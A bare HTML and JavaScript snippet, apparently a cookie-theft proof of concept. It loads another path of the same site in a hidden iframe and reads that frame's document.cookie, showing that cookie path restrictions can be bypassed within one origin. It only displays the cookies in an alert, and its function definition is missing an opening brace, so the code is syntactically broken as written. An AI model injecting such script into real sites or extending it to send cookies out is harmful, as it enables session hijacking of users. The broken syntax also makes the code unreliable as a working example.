<script>
function cookiepath(path)
  for (var i = 0; i < window.frames.length; i++) {
    frameURL = window.frames[i].location.toString();
    if (frameURL.indexOf(path) > -1)
      alert(window.frames[i].document.cookie);
  }
</script>
<iframe onload="cookiepath('/path1/')" style="display:none;" src="/path1/index.php"></iframe>
